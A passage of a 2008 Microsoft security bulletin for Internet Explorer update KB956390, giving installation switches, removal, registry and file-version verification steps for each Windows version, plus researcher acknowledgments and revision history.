#### Windows 2000 (all editions)

**Reference Table**

The following table contains the security update information for this software. You can find additional information in the subsection, **Deployment Information**, in this section.

| **Inclusion in Future Service Packs** | The update for this issue may be included in a future update rollup |
| --- | --- |
| **Deployment** |  |
| Installing without user intervention | For Internet Explorer 5.01 Service Pack 4 on all supported editions of Windows 2000:\ IE5.01sp4-KB956390-Windows2000sp4-x86-enu /quiet\ \ For Internet Explorer 6 Service Pack 1 when installed on all supported editions of Windows 2000:\ IE6.0sp1-KB956390-Windows2000-x86-enu /quiet |
| Installing without restarting | For Internet Explorer 5.01 Service Pack 4 on all supported editions of Windows 2000:\ IE5.01sp4-KB956390-Windows2000sp4-x86-enu /norestart\ \ For Internet Explorer 6 Service Pack 1 when installed on all supported editions of Windows 2000:\ IE6.0sp1-KB956390-Windows2000-x86-enu /norestart |
| Update log file | For Internet Explorer 5.01 Service Pack 4 on all supported editions of Windows 2000:\ KB956390-IE501SP4-20080820.120000.log\ \ For Internet Explorer 6 Service Pack 1 when installed on all supported editions of Windows 2000:\ KB956390-IE6SP1-20080820.120000.log |
| Further information | See the subsection, **Detection and Deployment Tools and Guidance** |
| **Restart Requirement** |  |
| Restart required | Yes, you must restart your system after you apply this security update |
| Hotpatching | Not applicable |
| **Removal Information** | For Internet Explorer 5.01 Service Pack 4 on all supported editions of Windows 2000:\ Use Add or Remove Programs tool in Control Panel or the Spuninst.exe utility located in the %Windir%$NTUninstallKB956390-IE501SP4-20080820.120000$\Spuninst folder\ \ For Internet Explorer 6 Service Pack 1 when installed on all supported editions of Windows 2000:\ Use Add or Remove Programs tool in Control Panel or the Spuninst.exe utility located in the %Windir%$NTUninstallKB956390-IE6SP1-20080820.120000$\Spuninst folder |
| **File Information** | See [Microsoft Knowledge Base Article 956390](https://support.microsoft.com/kb/956390) |
| **Registry Key Verification** | For Internet Explorer 5.01 Service Pack 4 on all supported editions of Microsoft Windows 2000 Service Pack 4:\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Internet Explorer 5.01\SP4\KB956390-IE501SP4-20080820.120000\Filelist\ \ For Internet Explorer 6 Service Pack 1 when installed on all supported editions of Microsoft Windows 2000 Service Pack 4:\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Internet Explorer 6\SP1\KB956390-IE6SP1-20080820.120000\Filelist |

#### Deployment Information

**Installing the Update**

When you install this security update, the installer checks whether one or more of the files that are being updated on your system have previously been updated by a Microsoft hotfix.

If you have previously installed a hotfix to update one of these files, the installer copies the RTMQFE, SP1QFE, or SP2QFE files to your system. Otherwise, the installer copies the RTMGDR, SP1GDR, or SP2GDR files to your system. Security updates may not contain all variations of these files. For more information about this behavior, see [Microsoft Knowledge Base Article 824994](https://support.microsoft.com/kb/824994).

For more information about the installer, visit the [Microsoft TechNet Web site](https://go.microsoft.com/fwlink/?linkid=38951).

For more information about the terminology that appears in this bulletin, such as *hotfix*, see [Microsoft Knowledge Base Article 824684](https://support.microsoft.com/kb/824684).

This security update supports the following setup switches.

| Switch | Description |
| --- | --- |
| **/help** | Displays the command-line options |
| Setup Modes |  |
| **/passive** | Unattended Setup mode. No user interaction is required, but installation status is displayed. If a restart is required at the end of Setup, a dialog box will be presented to the user with a timer warning that the computer will restart in 30 seconds. |
| **/quiet** | Quiet mode. This is the same as unattended mode, but no status or error messages are displayed. |
| Restart Options |  |
| **/norestart** | Does not restart when installation has completed |
| **/forcerestart** | Restarts the computer after installation and force other applications to close at shutdown without saving open files first. |
| **/warnrestart[:x]** | Presents a dialog box with a timer warning the user that the computer will restart in *x* seconds. (The default setting is 30 seconds.) Intended for use with the **/quiet** switch or the **/passive** switch. |
| **/promptrestart** | Display a dialog box prompting the local user to allow a restart |
| Special Options |  |
| **/overwriteoem** | Overwrites OEM files without prompting |
| **/nobackup** | Does not back up files needed for uninstall |
| **/forceappsclose** | Forces other programs to close when the computer shuts down |
| **/log:path** | Allows the redirection of installation log files |
| **/extract[:path]** | Extracts files without starting the Setup program |
| **/ER** | Enables extended error reporting |
| **/verbose** | Enables verbose logging. During installation, creates %Windir%\CabBuild.log. This log details the files that are copied. Using this switch may cause the installation to proceed more slowly. |

**Note** You can combine these switches into one command. For backward compatibility, the security update also supports the setup switches that the earlier version of the Setup program uses. For more information about the supported installation switches, see [Microsoft Knowledge Base Article 262841](https://support.microsoft.com/kb/262841).

**Removing the Update**

This security update supports the following setup switches.

| Switch | Description |
| --- | --- |
| **/help** | Displays the command-line options |
| Setup Modes |  |
| **/passive** | Unattended Setup mode. No user interaction is required, but installation status is displayed. If a restart is required at the end of Setup, a dialog box will be presented to the user with a timer warning that the computer will restart in 30 seconds. |
| **/quiet** | Quiet mode. This is the same as unattended mode, but no status or error messages are displayed. |
| Restart Options |  |
| **/norestart** | Does not restart when installation has completed |
| **/forcerestart** | Restarts the computer after installation and force other applications to close at shutdown without saving open files first. |
| **/warnrestart[:x]** | Presents a dialog box with a timer warning the user that the computer will restart in *x* seconds. (The default setting is 30 seconds.) Intended for use with the **/quiet** switch or the **/passive** switch. |
| **/promptrestart** | Display a dialog box prompting the local user to allow a restart |
| Special Options |  |
| **/forceappsclose** | Forces other programs to close when the computer shuts down |
| **/log:path** | Allows the redirection of installation log files |

**Verifying That the Update Has Been Applied**

* **Microsoft Baseline Security Analyzer**

  To verify that a security update has been applied to an affected system, you may be able to use the Microsoft Baseline Security Analyzer (MBSA) tool. See the section, Detection and Deployment Tools and Guidance, earlier in this bulletin for more information.
* **File Version Verification**

  Because there are several editions of Microsoft Windows, the following steps may be different on your system. If they are, see your product documentation to complete these steps.

  1. Click **Start**, and then click **Search**.
  2. In the **Search Results** pane, click **All files and folders** under **Search Companion**.
  3. In the **All or part of the file name** box, type a file name from the appropriate file information table, and then click **Search**.
  4. In the list of files, right-click a file name from the appropriate file information table, and then click **Properties**.
     **Note** Depending on the edition of the operating system, or the programs that are installed on your system, some of the files that are listed in the file information table may not be installed.
  5. On the **Version** tab, determine the version of the file that is installed on your system by comparing it to the version that is documented in the appropriate file information table.
     **Note** Attributes other than the file version may change during installation. Comparing other file attributes to the information in the file information table is not a supported method of verifying that the update has been applied. Also, in certain cases, files may be renamed during installation. If the file or version information is not present, use one of the other available methods to verify update installation.
* **Registry Key Verification**

  You may also be able to verify the files that this security update has installed by reviewing the registry keys listed in the **Reference Table** in this section.

  These registry keys may not contain a complete list of installed files. Also, these registry keys may not be created correctly when an administrator or an OEM integrates or slipstreams this security update into the Windows installation source files.

#### Windows XP (all editions)

**Reference Table**

The following table contains the security update information for this software. You can find additional information in the subsection, **Deployment Information**, in this section.

| **Inclusion in Future Service Packs** | The update for this issue will be included in a future service pack or update rollup |
| --- | --- |
| **Deployment** |  |
| Installing without user intervention | Internet Explorer 6 for Windows XP Service Pack 2 and Windows XP Service Pack 3:\ Windowsxp-KB956390-x86-enu /quiet |
| Internet Explorer 6 for Windows XP Professional x64 Edition and Windows XP Professional x64 Edition Service Pack 2:\ WindowsServer2003.WindowsXP-KB956390-x64-enu /quiet |  |
| Internet Explorer 7 for Windows XP Service Pack 2 and Windows XP Service Pack 3:\ IE7-WindowsXP-KB956390-x86-enu /quiet |  |
| Internet Explorer 7 for Windows XP Professional x64 Edition and Windows XP Professional x64 Edition Service Pack 2:\ IE7-WindowsServer2003.WindowsXP-KB956390-x64-enu /quiet |  |
| Installing without restarting | Internet Explorer 6 for Windows XP Service Pack 2 and Windows XP Service Pack 3:\ Windowsxp-KB956390-x86-enu /norestart |
| Internet Explorer 6 for Windows XP Professional x64 Edition and Windows XP Professional x64 Edition Service Pack 2:\ WindowsServer2003.WindowsXP-KB956390-x64-enu / norestart |  |
| Internet Explorer 7 for Windows XP Service Pack 2 and Windows XP Service Pack 3:\ IE7-WindowsXP-KB956390-x86-enu /norestart |  |
| Internet Explorer 7 for Windows XP Professional x64 Edition and Windows XP Professional x64 Edition Service Pack 2:\ IE7-WindowsServer2003.WindowsXP-KB956390-x64-enu /norestart |  |
| Update log file | Internet Explorer 6 for Windows XP Service Pack 2, Windows XP Service Pack 3, Windows XP Professional x64 Edition and Windows XP Professional x64 Edition Service Pack 2:\ KB956390.log |
| Internet Explorer 7 for Windows XP Service Pack 2, Windows XP Service Pack 3, Windows XP Professional x64 Edition and Windows XP Professional x64 Edition Service Pack 2:\ KB956390-IE7.log |  |
| Further information | See the subsection, **Detection and Deployment Tools and Guidance** |
| **Restart Requirement** |  |
| Restart required | Yes, you must restart your system after you apply this security update |
| Hotpatching | This security update does not support HotPatching. For more information about HotPatching, see [Microsoft Knowledge Base Article 897341](https://support.microsoft.com/kb/897341). |
| **Removal Information** | Internet Explorer 6 for Windows XP:\ Use Add or Remove Programs tool in Control Panel or the Spuninst.exe utility located in the %Windir%$NTUninstal\KB956390$\Spuninst folder |
| Internet Explorer 7 for Windows XP:\ Use Add or Remove Programs tool in Control Panel or the Spuninst.exe utility located in the %Windir%\ie7updates\KB956390-IE7\spuninst folder |  |
| **File Information** | See [Microsoft Knowledge Base Article 956390](https://support.microsoft.com/kb/956390) |
| **Registry Key Verification** | Internet Explorer 6 for all supported 32-bit editions of Windows XP:\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Windows XP\SP4\KB956390\Filelist |
| Internet Explorer 6 for all supported x64-based editions of Windows XP:\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Windows XP Version 2003\SP3\KB956390\Filelist |  |
| Internet Explorer 7 for all supported 32-bit editions of Windows XP:\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Windows XP\SP0\KB956390-IE7\Filelist |  |
| Internet Explorer 7 for all supported x64-based editions of Windows XP:\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Windows XP Version 2003\SP0\KB956390-IE7\Filelist |  |

**Note** For supported versions of Windows XP Professional x64 Edition, this security update is the same as supported versions of the Windows Server 2003 x64 Edition security update.

#### Deployment Information

**Installing the Update**

When you install this security update, the installer checks whether one or more of the files that are being updated on your system have previously been updated by a Microsoft hotfix.

If you have previously installed a hotfix to update one of these files, the installer copies the RTMQFE, SP1QFE, or SP2QFE files to your system. Otherwise, the installer copies the RTMGDR, SP1GDR, or SP2GDR files to your system. Security updates may not contain all variations of these files. For more information about this behavior, see [Microsoft Knowledge Base Article 824994](https://support.microsoft.com/kb/824994).

For more information about the installer, visit the [Microsoft TechNet Web site](https://go.microsoft.com/fwlink/?linkid=38951).

For more information about the terminology that appears in this bulletin, such as *hotfix*, see [Microsoft Knowledge Base Article 824684](https://support.microsoft.com/kb/824684).

This security update supports the following setup switches.

| Switch | Description |
| --- | --- |
| **/help** | Displays the command-line options |
| Setup Modes |  |
| **/passive** | Unattended Setup mode. No user interaction is required, but installation status is displayed. If a restart is required at the end of Setup, a dialog box will be presented to the user with a timer warning that the computer will restart in 30 seconds. |
| **/quiet** | Quiet mode. This is the same as unattended mode, but no status or error messages are displayed. |
| Restart Options |  |
| **/norestart** | Does not restart when installation has completed |
| **/forcerestart** | Restarts the computer after installation and force other applications to close at shutdown without saving open files first. |
| **/warnrestart[:x]** | Presents a dialog box with a timer warning the user that the computer will restart in *x* seconds. (The default setting is 30 seconds.) Intended for use with the **/quiet** switch or the **/passive** switch. |
| **/promptrestart** | Display a dialog box prompting the local user to allow a restart |
| Special Options |  |
| **/overwriteoem** | Overwrites OEM files without prompting |
| **/nobackup** | Does not back up files needed for uninstall |
| **/forceappsclose** | Forces other programs to close when the computer shuts down |
| **/log:path** | Allows the redirection of installation log files |
| **/integrate:path** | Integrates the update into the Windows source files. These files are located at the path that is specified in the switch. |
| **/extract[:path]** | Extracts files without starting the Setup program |
| **/ER** | Enables extended error reporting |
| **/verbose** | Enables verbose logging. During installation, creates %Windir%\CabBuild.log. This log details the files that are copied. Using this switch may cause the installation to proceed more slowly. |

**Note** You can combine these switches into one command. For backward compatibility, the security update also supports the setup switches that the earlier version of the Setup program uses. For more information about the supported installation switches, see [Microsoft Knowledge Base Article 262841](https://support.microsoft.com/kb/262841).

**Removing the Update**

This security update supports the following setup switches.

| Switch | Description |
| --- | --- |
| **/help** | Displays the command-line options |
| Setup Modes |  |
| **/passive** | Unattended Setup mode. No user interaction is required, but installation status is displayed. If a restart is required at the end of Setup, a dialog box will be presented to the user with a timer warning that the computer will restart in 30 seconds. |
| **/quiet** | Quiet mode. This is the same as unattended mode, but no status or error messages are displayed. |
| Restart Options |  |
| **/norestart** | Does not restart when installation has completed |
| **/forcerestart** | Restarts the computer after installation and force other applications to close at shutdown without saving open files first. |
| **/warnrestart[:x]** | Presents a dialog box with a timer warning the user that the computer will restart in *x* seconds. (The default setting is 30 seconds.) Intended for use with the **/quiet** switch or the **/passive** switch. |
| **/promptrestart** | Display a dialog box prompting the local user to allow a restart |
| Special Options |  |
| **/forceappsclose** | Forces other programs to close when the computer shuts down |
| **/log:path** | Allows the redirection of installation log files |

**Verifying That the Update Has Been Applied**

* **Microsoft Baseline Security Analyzer**

  To verify that a security update has been applied to an affected system, you may be able to use the Microsoft Baseline Security Analyzer (MBSA) tool. See the section, Detection and Deployment Tools and Guidance, earlier in this bulletin for more information.
* **File Version Verification**

  Because there are several editions of Microsoft Windows, the following steps may be different on your system. If they are, see your product documentation to complete these steps.

  1. Click **Start**, and then click **Search**.
  2. In the **Search Results** pane, click **All files and folders** under **Search Companion**.
  3. In the **All or part of the file name** box, type a file name from the appropriate file information table, and then click **Search**.
  4. In the list of files, right-click a file name from the appropriate file information table, and then click **Properties**.
     **Note** Depending on the edition of the operating system, or the programs that are installed on your system, some of the files that are listed in the file information table may not be installed.
  5. On the **Version** tab, determine the version of the file that is installed on your system by comparing it to the version that is documented in the appropriate file information table.
     **Note** Attributes other than the file version may change during installation. Comparing other file attributes to the information in the file information table is not a supported method of verifying that the update has been applied. Also, in certain cases, files may be renamed during installation. If the file or version information is not present, use one of the other available methods to verify update installation.
* **Registry Key Verification**

  You may also be able to verify the files that this security update has installed by reviewing the registry keys listed in the **Reference Table** in this section.

  These registry keys may not contain a complete list of installed files. Also, these registry keys may not be created correctly when an administrator or an OEM integrates or slipstreams this security update into the Windows installation source files.

#### Windows Server 2003 (all editions)

**Reference Table**

The following table contains the security update information for this software. You can find additional information in the subsection, **Deployment Information**, in this section.

| **Inclusion in Future Service Packs** | The update for this issue will be included in a future service pack or update rollup |
| --- | --- |
| **Deployment** |  |
| Installing without user intervention | Internet Explorer 6 for all supported 32-bit editions of Windows Server 2003:\ Windowsserver2003-KB956390-x86-enu /quiet |
| Internet Explorer 6 for all supported x64-based editions of Windows Server 2003:\ WindowsServer2003.WindowsXP-KB956390-x64-enu /quiet |  |
| Internet Explorer 6 for all supported Itanium-based editions of Windows Server 2003:\ Windowsserver2003-KB956390-ia64-enu /quiet |  |
| Internet Explorer 7 for all supported 32-bit editions of Windows Server 2003:\ IE7-WindowsServer2003-KB956390-x86-enu /quiet |  |
| Internet Explorer 7 for all supported x64-based editions of Windows Server 2003:\ IE7-WindowsServer2003.WindowsXP-KB956390-x64-enu /quiet |  |
| Internet Explorer 7 for all supported Itanium-based editions of Windows Server 2003:\ IE7-WindowsServer2003-KB956390-ia64-enu /quiet |  |
| Installing without restarting | Internet Explorer 6 for all supported 32-bit editions of Windows Server 2003:\ Windowsserver2003-KB956390-x86-enu /norestart |
| Internet Explorer 6 for all supported x64-based editions of Windows Server 2003:\ WindowsServer2003.WindowsXP-KB956390-x64-enu /norestart |  |
| Internet Explorer 6 for all supported Itanium-based editions of Windows Server 2003:\ Windowsserver2003-KB956390-ia64-enu /norestart |  |
| Internet Explorer 7 for all supported 32-bit editions of Windows Server 2003:\ IE7-WindowsServer2003-KB956390-x86-enu /norestart |  |
| Internet Explorer 7 for all supported x64-based editions of Windows Server 2003:\ IE7-WindowsServer2003.WindowsXP-KB956390-x64-enu /norestart |  |
| Internet Explorer 7 for all supported Itanium-based editions of Windows Server 2003:\ IE7-WindowsServer2003-KB956390-ia64-enu /norestart |  |
| Update log file | Internet Explorer 6 for all supported 32-bit editions, x64-based editions, and Itanium-based editions of Windows Server 2003:KB956390.log |
| Internet Explorer 7 for all supported 32-bit editions, x64-based editions, and Itanium-based editions of Windows Server 2003:KB956390-IE7.log |  |
| Further information | See the subsection, **Detection and Deployment Tools and Guidance** |
| **Restart Requirement** |  |
| Restart required | Yes, you must restart your system after you apply this security update |
| Hotpatching | This security update does not support HotPatching. For more information about HotPatching, see [Microsoft Knowledge Base Article 897341](https://support.microsoft.com/kb/897341). |
| **Removal Information** | Internet Explorer 6 for all supported 32-bit editions, x64-based editions, and Itanium-based editions of Windows Server 2003:\ Use Add or Remove Programs tool in Control Panel or the Spuninst.exe utility located in the Use the Spuninst.exe utility, located in the %Windir%$NTUninstallKB956390$\Spuninst folder |
| Internet Explorer 7 for all supported 32-bit editions, x64-based editions, and Itanium-based editions of Windows Server 2003:\ Use Add or Remove Programs tool in Control Panel or the Spuninst.exe utility located in the %Windir%\ie7updates\KB956390-IE7\spuninst folder |  |
| **File Information** | See [Microsoft Knowledge Base Article 956390](https://support.microsoft.com/kb/956390) |
| **Registry Key Verification** | Internet Explorer 6 for all supported 32-bit editions, x64-based editions, and Itanium-based editions of Windows Server 2003:\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Windows Server 2003\SP3\KB956390\Filelist |
| Internet Explorer 7 for all supported 32-bit editions, x64-based editions, and Itanium-based editions of Windows Server 2003:\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Windows Server 2003\SP0\KB956390-IE7\Filelist |  |

#### Deployment Information

**Installing the Update**

When you install this security update, the installer checks to see if one or more of the files that are being updated on your system have previously been updated by a Microsoft hotfix.

If you have previously installed a hotfix to update one of these files, the installer copies the RTMQFE, SP1QFE, or SP2QFE files to your system. Otherwise, the installer copies the RTMGDR, SP1GDR, or SP2GDR files to your system. Security updates may not contain all variations of these files. For more information about this behavior, see [Microsoft Knowledge Base Article 824994](https://support.microsoft.com/kb/824994).

For more information about the installer, visit the [Microsoft TechNet Web site](https://go.microsoft.com/fwlink/?linkid=38951).

For more information about the terminology that appears in this bulletin, such as *hotfix*, see [Microsoft Knowledge Base Article 824684](https://support.microsoft.com/kb/824684).

This security update supports the following setup switches.

| Switch | Description |
| --- | --- |
| **/help** | Displays the command-line options |
| Setup Modes |  |
| **/passive** | Unattended Setup mode. No user interaction is required, but installation status is displayed. If a restart is required at the end of Setup, a dialog box will be presented to the user with a timer warning that the computer will restart in 30 seconds. |
| **/quiet** | Quiet mode. This is the same as unattended mode, but no status or error messages are displayed. |
| Restart Options |  |
| **/norestart** | Does not restart when installation has completed |
| **/forcerestart** | Restarts the computer after installation and force other applications to close at shutdown without saving open files first. |
| **/warnrestart[:x]** | Presents a dialog box with a timer warning the user that the computer will restart in *x* seconds. (The default setting is 30 seconds.) Intended for use with the **/quiet** switch or the **/passive** switch. |
| **/promptrestart** | Display a dialog box prompting the local user to allow a restart |
| Special Options |  |
| **/overwriteoem** | Overwrites OEM files without prompting |
| **/nobackup** | Does not back up files needed for uninstall |
| **/forceappsclose** | Forces other programs to close when the computer shuts down |
| **/log:path** | Allows the redirection of installation log files |
| **/integrate:path** | Integrates the update into the Windows source files. These files are located at the path that is specified in the switch. |
| **/extract[:path]** | Extracts files without starting the Setup program |
| **/ER** | Enables extended error reporting |
| **/verbose** | Enables verbose logging. During installation, creates %Windir%\CabBuild.log. This log details the files that are copied. Using this switch may cause the installation to proceed more slowly. |

**Note** You can combine these switches into one command. For backward compatibility, the security update also supports many of the setup switches that the earlier version of the Setup program uses. For more information about the supported installation switches, see [Microsoft Knowledge Base Article 262841](https://support.microsoft.com/kb/262841).

**Removing the Update**

This security update supports the following setup switches.

| Switch | Description |
| --- | --- |
| **/help** | Displays the command-line options |
| Setup Modes |  |
| **/passive** | Unattended Setup mode. No user interaction is required, but installation status is displayed. If a restart is required at the end of Setup, a dialog box will be presented to the user with a timer warning that the computer will restart in 30 seconds. |
| **/quiet** | Quiet mode. This is the same as unattended mode, but no status or error messages are displayed. |
| Restart Options |  |
| **/norestart** | Does not restart when installation has completed |
| **/forcerestart** | Restarts the computer after installation and force other applications to close at shutdown without saving open files first. |
| **/warnrestart[:x]** | Presents a dialog box with a timer warning the user that the computer will restart in *x* seconds. (The default setting is 30 seconds.) Intended for use with the **/quiet** switch or the **/passive** switch. |
| **/promptrestart** | Display a dialog box prompting the local user to allow a restart |
| Special Options |  |
| **/forceappsclose** | Forces other programs to close when the computer shuts down |
| **/log:path** | Allows the redirection of installation log files |

**Verifying that the Update Has Been Applied**

* **Microsoft Baseline Security Analyzer**

  To verify that a security update has been applied to an affected system, you may be able to use the Microsoft Baseline Security Analyzer (MBSA) tool. See the section, Detection and Deployment Tools and Guidance, earlier in this bulletin for more information.
* **File Version Verification**

  Because there are several editions of Microsoft Windows, the following steps may be different on your system. If they are, see your product documentation to complete these steps.

  1. Click **Start**, and then click **Search**.
  2. In the **Search Results** pane, click **All files and folders** under **Search Companion**.
  3. In the **All or part of the file name** box, type a file name from the appropriate file information table, and then click **Search**.
  4. In the list of files, right-click a file name from the appropriate file information table, and then click **Properties**.
     **Note** Depending on the edition of the operating system, or the programs that are installed on your system, some of the files that are listed in the file information table may not be installed.
  5. On the **Version** tab, determine the version of the file that is installed on your system by comparing it to the version that is documented in the appropriate file information table.
     **Note** Attributes other than the file version may change during installation. Comparing other file attributes to the information in the file information table is not a supported method of verifying that the update has been applied. Also, in certain cases, files may be renamed during installation. If the file or version information is not present, use one of the other available methods to verify update installation.
* **Registry Key Verification**

  You may also be able to verify the files that this security update has installed by reviewing the registry keys listed in the **Reference Table** in this section.

  These registry keys may not contain a complete list of installed files. Also, these registry keys may not be created correctly when an administrator or an OEM integrates or slipstreams this security update into the Windows installation source files.

#### Windows Vista (all editions)

**Reference Table**

The following table contains the security update information for this software. You can find additional information in the subsection, **Deployment Information**, in this section.

| **Inclusion in Future Service Packs** | The update for this issue will be included in a future service pack or update rollup |
| --- | --- |
| **Deployment** |  |
| Installing without user intervention | Internet Explorer 7 in all supported 32-bit editions of Windows Vista:\ Windows6.0-KB956390-x86 /quiet |
| Internet Explorer 7 in all supported x64-based editions of Windows Vista:\ Windows6.0-KB956390-x64 /quiet |  |
| Installing without restarting | Internet Explorer 7 in all supported 32-bit editions of Windows Vista:\ Windows6.0-KB956390-x86 /quiet /norestart |
| Internet Explorer 7 in all supported x64-based editions of Windows Vista:\ Windows6.0-KB956390-x64 /quiet /norestart |  |
| Further information | See the subsection, **Detection and Deployment Tools and Guidance** |
| **Restart Requirement** |  |
| Restart required | Yes, you must restart your system after you apply this security update |
| Hotpatching | This security update does not support HotPatching. For more information about HotPatching, see [Microsoft Knowledge Base Article 897341](https://support.microsoft.com/kb/897341). |
| **Removal Information** | WUSA.exe does not support uninstall of updates. To uninstall an update installed by WUSA, click **Control Panel**, and then click **Security**. Under Windows Update, click **View installed updates** and select from the list of updates. |
| **File Information** | See [Microsoft Knowledge Base Article 956390](https://support.microsoft.com/kb/956390) |
| **Registry Key Verification** | **Note** A registry key does not exist to validate the presence of this update. |

#### Deployment Information

**Installing the Update**

When you install this security update, the installer checks whether one or more of the files that are being updated on your system have previously been updated by a Windows hotfix. If you have previously installed a hotfix to update one of these files, the installer will apply the LDR version of this update. Otherwise, the installer will apply the GDR version of the update. For more information about this behavior, see [Microsoft Knowledge Base Article 824994](https://support.microsoft.com/kb/824994).

For more information about the installer, see [Microsoft Knowledge Base Article 934307](https://support.microsoft.com/kb/934307).

For more information about the terminology that appears in this bulletin, such as *hotfix*, see [Microsoft Knowledge Base Article 824684](https://support.microsoft.com/kb/824684).

This security update supports the following setup switches.

| Switch | Description |
| --- | --- |
| **/?, /h, /help** | Displays help on supported switches. |
| **/quiet** | Suppresses the display of status or error messages. |
| **/norestart** | When combined with /quiet, the system will not be restarted after installation even if a restart is required to complete installation. |

**Note** For more information about the installer, see [Microsoft Knowledge Base Article 934307](https://support.microsoft.com/kb/934307).

**Verifying that the Update Has Been Applied**

* **Microsoft Baseline Security Analyzer**

  To verify that a security update has been applied to an affected system, you may be able to use the Microsoft Baseline Security Analyzer (MBSA) tool. See the section, Detection and Deployment Tools and Guidance, earlier in this bulletin for more information.
* **File Version Verification**

  **Note** Because there are several editions of Microsoft Windows, the following steps may be different on your system. If they are, see your product documentation to complete these steps.

  1. Click **Start** and then enter an update file name in **Start Search**.
  2. When the file appears under **Programs**, right-click on the file name and click **Properties**.
  3. Under the **General** tab, compare the file size with the file information tables provided earlier in this section.
  4. You may also click on the **Details** tab and compare information, such as file version and date modified, with the file information tables provided earlier in this section.
  5. Finally, you may also click on the **Previous Versions** tab and compare file information for the previous version of the file with the file information for the new, or updated, version of the file.

#### Windows Server 2008 (all editions)

**Reference Table**

The following table contains the security update information for this software. You can find additional information in the subsection, **Deployment Information**, in this section.

| **Inclusion in Future Service Packs** | The update for this issue will be included in a future service pack or update rollup |
| --- | --- |
| **Deployment** |  |
| Installing without user intervention | Internet Explorer 7 in all supported 32-bit editions of Windows Server 2008:\ Windows6.0-KB956390-x86 /quiet |
| Internet Explorer 7 in all supported x64-based editions of Windows Server 2008:\ Windows6.0-KB956390-x64 /quiet |  |
| Internet Explorer 7 in all supported Itanium-based editions of Windows Server 2008:Windows6.0-KB956390-ia64 /quiet |  |
| Installing without restarting | Internet Explorer 7 in all supported 32-bit editions of Windows Server 2008:\ Windows6.0-KB956390-x86 /quiet /norestart |
| Internet Explorer 7 in all supported x64-based editions of Windows Server 2008:\ Windows6.0-KB956390-x64 /quiet /norestart |  |
| Internet Explorer 7 in all supported Itanium-based editions of Windows Server 2008:Windows6.0-KB956390-ia64 /quiet /norestart |  |
| Further information | See the subsection, **Detection and Deployment Tools and Guidance** |
| **Restart Requirement** |  |
| Restart required | Yes, you must restart your system after you apply this security update |
| Hotpatching | This security update does not support HotPatching. For more information about HotPatching, see [Microsoft Knowledge Base Article 897341](https://support.microsoft.com/kb/897341). |
| **Removal Information** | WUSA.exe does not support uninstall of updates. To uninstall an update installed by WUSA, click **Control Panel**, and then click **Security**. Under Windows Update, click **View installed updates** and select from the list of updates. |
| **File Information** | See [Microsoft Knowledge Base Article 956390](https://support.microsoft.com/kb/956390) |
| **Registry Key Verification** | **Note** A registry key does not exist to validate the presence of this patch. |

#### Deployment Information

**Installing the Update**

When you install this security update, the installer checks whether one or more of the files that are being updated on your system have previously been updated by a Windows hotfix. If you have previously installed a hotfix to update one of these files, the installer will apply the LDR version of this update. Otherwise, the installer will apply the GDR version of the update. For more information about this behavior, see [Microsoft Knowledge Base Article 824994](https://support.microsoft.com/kb/824994).

For more information about the installer, see [Microsoft Knowledge Base Article 934307](https://support.microsoft.com/kb/934307).

For more information about the terminology that appears in this bulletin, such as *hotfix*, see [Microsoft Knowledge Base Article 824684](https://support.microsoft.com/kb/824684).

This security update supports the following setup switches.

| Switch | Description |
| --- | --- |
| **/?, /h, /help** | Displays help on supported switches. |
| **/quiet** | Suppresses the display of status or error messages. |
| **/norestart** | When combined with /quiet, the system will not be restarted after installation even if a restart is required to complete installation. |

**Note** For more information about the installer, see [Microsoft Knowledge Base Article 934307](https://support.microsoft.com/kb/934307).

**Verifying that the Update Has Been Applied**

* **Microsoft Baseline Security Analyzer**

  To verify that a security update has been applied to an affected system, you may be able to use the Microsoft Baseline Security Analyzer (MBSA) tool. See the section, Detection and Deployment Tools and Guidance, earlier in this bulletin for more information.
* **File Version Verification**

  **Note** Because there are several editions of Microsoft Windows, the following steps may be different on your system. If they are, see your product documentation to complete these steps.

  1. Click **Start** and then enter an update file name in **Start Search**.
  2. When the file appears under **Programs**, right-click on the file name and click **Properties**.
  3. Under the **General** tab, compare the file size with the file information tables provided earlier in this section.
  4. You may also click on the **Details** tab and compare information, such as file version and date modified, with the file information tables provided earlier in this section.
  5. Finally, you may also click on the **Previous Versions** tab and compare file information for the previous version of the file with the file information for the new, or updated, version of the file.

### Other Information

#### Acknowledgments

Microsoft [thanks](https://go.microsoft.com/fwlink/?linkid=21127) the following for working with us to help protect customers:

* David Bloom for reporting the HTML Element Cross-Domain Vulnerability (CVE-2008-3472)
* Gregory Rubin for reporting the Event Handling Cross-Domain Vulnerability (CVE-2008-3473)
* [Ivan Fratric](https://ifsec.blogspot.com/), working with [TippingPoint](https://www.tippingpoint.com/) and the [Zero Day Initiative](https://www.zerodayinitiative.com/), for reporting the Uninitialized Memory Corruption Vulnerability (CVE-2008-3475)
* Thierry Zoller of [n.runs](https://www.nruns.com/) for reporting the HTML Objects Memory Corruption Vulnerability (CVE-2008-3476)
* Lee Dagon of [Composica](https://www.composica.com/) for reporting the Cross-Domain Information Disclosure Vulnerability (CVE-2008-3474)

#### Support

* Customers in the U.S. and Canada can receive technical support from [Microsoft Product Support Services](https://go.microsoft.com/fwlink/?linkid=21131) at 1-866-PCSAFETY. There is no charge for support calls that are associated with security updates.
* International customers can receive support from their local Microsoft subsidiaries. There is no charge for support that is associated with security updates. For more information about how to contact Microsoft for support issues, visit the [International Support Web site](https://go.microsoft.com/fwlink/?linkid=21155).

#### Disclaimer

The information provided in the Microsoft Knowledge Base is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

#### Revisions

* V1.0 (October 14, 2008): Bulletin published.
* V1.1 (October 15, 2008): Corrected a registry key verification entry for Windows Server 2003, and corrected File Information links.
